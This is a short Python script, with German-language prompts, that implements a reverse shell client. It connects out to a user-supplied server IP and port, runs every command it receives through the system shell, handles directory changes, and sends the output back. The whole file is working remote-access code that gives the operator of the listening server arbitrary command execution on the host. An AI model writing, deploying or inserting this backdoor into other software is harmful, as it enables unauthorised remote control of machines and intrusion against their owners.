import subprocess
import os
import socket

server_ip = input("Server IP-Adresse: ")
server_port = int(input("Server Port: "))

server_socket = socket.socket()

server_socket.connect((server_ip,server_port))

while True:
	command = server_socket.recv(8192).decode("utf-8")
	if command.startswith("cd "):
		os.chdir(command[3:])
		server_socket.send(b"Shell-after-cd> ")
		continue
	if len(command) > 0:
		proc = subprocess.run(command, shell=True, capture_output=True)
		data = proc.stdout + proc.stderr
		server_socket.send(data + b"Shell--> ")
	else:
		break
server_socket.close()

